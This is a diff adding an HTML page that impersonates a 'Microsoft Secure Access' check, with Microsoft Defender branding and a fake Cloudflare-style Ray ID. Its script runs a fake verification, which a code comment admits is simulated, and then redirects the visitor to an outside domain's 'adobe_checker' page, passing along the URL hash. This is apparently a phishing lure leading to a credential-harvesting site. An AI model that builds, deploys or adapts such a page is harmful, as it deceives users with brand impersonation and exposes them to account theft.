@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microsoft Secure Access</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background: #f3f2f1;
+        font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 20px;
+    }
+
+    /* Microsoft Fluent Design Card */
+    .ms-card {
+        background: #ffffff;
+        border: 1px solid #e1e1e1;
+        border-radius: 8px;
+        padding: 40px 32px 30px;
+        width: 380px;
+        text-align: center;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+    }
+
+    /* Microsoft Shield Icon */
+    .ms-icon {
+        width: 64px;
+        height: 64px;
+        background: #0078d4;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+    }
+    .ms-icon svg {
+        width: 32px;
+        height: 32px;
+        color: white;
+    }
+
+    /* Microsoft Typography */
+    .ms-title {
+        font-size: 20px;
+        font-weight: 600;
+        color: #323130;
+        margin-bottom: 8px;
+        letter-spacing: -0.2px;
+    }
+
+    .ms-subtitle {
+        font-size: 14px;
+        color: #605e5c;
+        margin-bottom: 28px;
+    }
+
+    /* Microsoft Button */
+    .ms-btn {
+        width: 100%;
+        padding: 12px 20px;
+        background: #0078d4;
+        color: white;
+        font-size: 15px;
+        font-weight: 500;
+        font-family: 'Segoe UI', sans-serif;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        transition: background 0.18s;
+        user-select: none;
+    }
+    .ms-btn:hover {
+        background: #106ebe;
+    }
+    .ms-btn.verified {
+        background: #107c10;
+        cursor: default;
+    }
+    .ms-btn.verified:hover {
+        background: #107c10;
+    }
+
+    /* Microsoft Loading Spinner */
+    .ms-spinner {
+        width: 18px;
+        height: 18px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-top-color: white;
+        border-radius: 50%;
+        animation: spin 0.7s linear infinite;
+        display: none;
+        flex-shrink: 0;
+    }
+
+    .ms-check {
+        width: 18px;
+        height: 18px;
+        display: none;
+        flex-shrink: 0;
+    }
+    .ms-check svg {
+        width: 100%;
+        height: 100%;
+        stroke: white;
+        stroke-width: 2.5;
+    }
+
+    .ms-btn.verified .ms-check {
+        display: block;
+    }
+    .ms-btn.verified .ms-spinner {
+        display: none;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    /* Microsoft Footer */
+    .ms-footer {
+        margin-top: 24px;
+        font-size: 11px;
+        color: #8a8886;
+        border-top: 1px solid #e1e1e1;
+        padding-top: 16px;
+    }
+
+    .ms-footer span {
+        color: #0078d4;
+        font-weight: 500;
+    }
+
+    #rid {
+        display: inline;
+        font-family: monospace;
+        color: #8a8886;
+    }
+</style>
+</head>
+<body>
+<div class="ms-card">
+    <!-- Microsoft Shield Icon -->
+    <div class="ms-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2"></rect>
+            <path d="M7 11V7a5 5 0 0110 0v4"></path>
+        </svg>
+    </div>
+
+    <!-- Microsoft Typography -->
+    <div class="ms-title">Microsoft Secure Access</div>
+    <div class="ms-subtitle">Verifying your connection...</div>
+
+    <!-- Microsoft Button -->
+    <div class="ms-btn" id="verifyBtn">
+        <div class="ms-spinner" id="spinner"></div>
+        <div class="ms-check">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"></polyline>
+            </svg>
+        </div>
+        <span id="buttonText">Verify access</span>
+    </div>
+
+    <!-- Microsoft Footer -->
+    <div class="ms-footer">
+        Ray ID: <span id="rid">UNK</span> • Microsoft Defender protected
+    </div>
+</div>
+
+<script>
+    (function() {
+        // Get Ray ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const rayIdElem = document.getElementById('rid');
+        if (rayIdElem) {
+            rayIdElem.textContent = (urlParams.get('ray') || 'UNK').substring(0, 8);
+        }
+
+        // DOM elements
+        const verifyBtn = document.getElementById('verifyBtn');
+        const spinner = document.getElementById('spinner');
+        const buttonText = document.getElementById('buttonText');
+        let isProcessing = false;
+
+        // Fake verification function (simulates Cloudflare challenge)
+        function simulateVerification() {
+            return new Promise((resolve) => {
+                setTimeout(() => resolve({ success: true }), 1500);
+            });
+        }
+
+        // Handle button click
+        verifyBtn.addEventListener('click', async () => {
+            if (isProcessing || verifyBtn.classList.contains('verified')) return;
+            
+            isProcessing = true;
+            spinner.style.display = 'block';
+            buttonText.textContent = 'Verifying...';
+            
+            try {
+                const result = await simulateVerification();
+                
+                if (result.success) {
+                    spinner.style.display = 'none';
+                    verifyBtn.classList.add('verified');
+                    buttonText.textContent = 'Verified';
+                    
+                    // Redirect to target page
+                    setTimeout(() => {
+                        window.location.href = "https://ravol.sbs/adobe/adobe_checker.html" + window.location.hash;
+                    }, 800);
+                } else {
+                    throw new Error('Verification failed');
+                }
+            } catch (error) {
+                console.error('Verification error:', error);
+                spinner.style.display = 'none';
+                buttonText.textContent = 'Retry';
+                isProcessing = false;
+            }
+        });
+    })();
+</script>
+
+<!-- Cloudflare Analytics (kept as original) -->
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"c467bb0c5782404493bed03ac6430c16","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
